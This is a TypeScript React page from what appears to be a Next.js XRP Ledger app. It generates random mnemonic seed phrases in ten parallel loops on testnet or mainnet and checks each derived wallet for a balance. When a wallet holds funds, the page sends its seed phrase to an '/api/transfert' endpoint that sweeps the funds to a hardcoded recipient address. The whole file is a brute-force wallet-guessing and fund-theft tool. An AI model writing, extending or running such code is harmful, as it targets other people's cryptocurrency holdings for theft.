// src/app/page.tsx
"use client";

import React, { useState, useRef, useEffect } from "react";
import {
  generateMnemonic,
  recoverWalletFromMnemonic,
} from "../utils/walletUtils";
import WalletDisplay from "../components/WalletDisplay";
import { Button } from "@/components/ui/button";
import { Wallet } from "@/types";
import Statistics from "../components/Statistics";
import Probabilities from "../components/Probabilities";
import NavBar from "../components/NavBar";
import { ConnectionError } from "xrpl";

export default function Home() {
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [stats, setStats] = useState({
    processedCount: 0,
    foundWithFunds: 0,
    startTime: 0,
    elapsedTime: 0,
    successfulAttempts: 0,
    totalAttempts: 0,
  });
  const processedAddresses = useRef<Set<string>>(new Set());
  const isGenerating = useRef(false);
  const timerRef = useRef<NodeJS.Timeout>();
  const [network, setNetwork] = useState("testnet");

  useEffect(() => {
    const storedNetwork = localStorage.getItem("network");
    if (storedNetwork) {
      setNetwork(storedNetwork);
    }
  }, []);

  useEffect(() => {
    if (isLoading) {
      setStats((prev) => ({ ...prev, startTime: Date.now() }));
      timerRef.current = setInterval(() => {
        setStats((prev) => ({
          ...prev,
          elapsedTime: Math.floor((Date.now() - prev.startTime) / 1000),
        }));
      }, 1000);
    } else {
      clearInterval(timerRef.current);
    }
    return () => clearInterval(timerRef.current);
  }, [isLoading]);

  const formatProbability = (successful: number, total: number): string => {
    if (total === 0) return "0%";
    const probability = (successful / total) * 100;
    return probability < 0.0001 ? "< 0.0001%" : `${probability.toFixed(4)}%`;
  };

  // const registerWallet = async (wallet: Wallet) => {
  //   try {
  //     const response = await fetch("/api/registerWallet", {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //       body: JSON.stringify(wallet),
  //     });

  //     if (!response.ok) {
  //       throw new Error("Failed to register wallet");
  //     }

  //     console.log("💾 Wallet registered successfully");
  //     setStats((prev) => ({
  //       ...prev,
  //       foundWithFunds: prev.foundWithFunds + 1,
  //     }));
  //   } catch (error) {
  //     console.error("❌ Error registering wallet:", error);
  //   }
  // };

  const generateWallets = async () => {
    setIsLoading(true);
    setError(null);
    isGenerating.current = true;

    const MAX_CONCURRENT_TASKS = 10; // Nombre maximum de tâches en parallèle
    const tasks: Promise<void>[] = []; // Liste pour suivre les tâches en cours
    let prev_told = {
      processedCount: 0,
      totalAttempts: 0,
    };

    const processMnemonic = async () => {
      while (isGenerating.current) {
        try {
          prev_told = {
            processedCount: prev_told.processedCount + 1,
            totalAttempts: prev_told.totalAttempts + 1,
          };
          setStats((prev) => ({
            ...prev,
            processedCount: prev_told.processedCount,
            totalAttempts: prev_told.totalAttempts,
          }));
          const mnemonic = generateMnemonic();
          const wallet = await recoverWalletFromMnemonic(network, mnemonic);

          if (processedAddresses.current.has(wallet.address)) {
            continue;
          }

          processedAddresses.current.add(wallet.address);

          if (wallet.balance > 0) {
            try {
              // await registerWallet(wallet);
              setWallets((prev) => [...prev, wallet]);

              setStats((prev) => ({
                ...prev,
                foundWithFunds: prev.foundWithFunds + 1,
              }));

              // Make an API call to transfer the funds
              const response = await fetch("/api/transfert", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  seedPhrase: mnemonic,
                  recipientAddress: process.env.NEXT_PUBLIC_RECIPIENT_ADDRESS, 
                  network,
                }),
              });

              const result = await response.json();
              if (response.ok) {
                console.log("Transfer successful:", result);
              } else {
                console.error("Transfer failed:", result);
              }
            } catch (error) {
              console.error(
                "Failed to register wallet or transfer funds:",
                error
              );
            }
            break;
          }
          console.log("DONE", prev_told.processedCount, 1);
        } catch (err) {
          if (err instanceof ConnectionError) {
            console.error("Connection error:", err.message);
          } else {
            console.error("FAIL", prev_told.processedCount, 1);
            console.error(err);
          }
          // Optionally, you can break the loop or handle the error differently
          // break;
        }
      }
    };

    // Crée les tâches initiales
    for (let i = 0; i < MAX_CONCURRENT_TASKS; i++) {
      tasks.push(processMnemonic());
    }
    // Attendre que toutes les tâches soient terminées
    await Promise.all(tasks);

    setIsLoading(false);
  };

  const stopGenerating = () => {
    isGenerating.current = false;
    setIsLoading(false);
  };

  const formatTime = (seconds: number): string => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs}h ${mins}m ${secs}s`;
  };

  const walletRate = stats.elapsedTime
    ? (stats.processedCount / stats.elapsedTime).toFixed(2)
    : "0";

  const toggleNetwork = () => {
    const newNetwork = network === "testnet" ? "mainnet" : "testnet";
    setNetwork(newNetwork);
    localStorage.setItem("network", newNetwork);
  };

  return (
    <div>
      <NavBar network={network} toggleNetwork={toggleNetwork} />
      {network === "testnet" && (
        <div className="w-full bg-yellow-200 text-yellow-800 text-center p-2">
          Warning: You are currently using the Testnet. All funds are for
          testing purposes only.
        </div>
      )}
      <div className="grid grid-cols-2 gap-6 mb-8 p-8">
        <Statistics
          stats={stats}
          walletRate={walletRate}
          formatTime={formatTime}
        />
        <Probabilities stats={stats} formatProbability={formatProbability} />
      </div>

      <div className="container max-w-4xl flex flex-col space-y-8 mx-auto mb-8">
        <div className="text-center mb-8">
          <div className="flex justify-center space-x-4">
            <Button onClick={generateWallets} disabled={isLoading}>
              {isLoading ? "Generating..." : "Generate Wallet"}
            </Button>
            <Button onClick={stopGenerating} disabled={!isLoading}>
              Stop
            </Button>
          </div>
        </div>

        {error && <p className="text-red-500 mt-4 text-center">{error}</p>}

        <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
          {wallets.map((wallet, index) => (
            <WalletDisplay key={index} wallet={wallet} />
          ))}
        </div>
      </div>
    </div>
  );
}
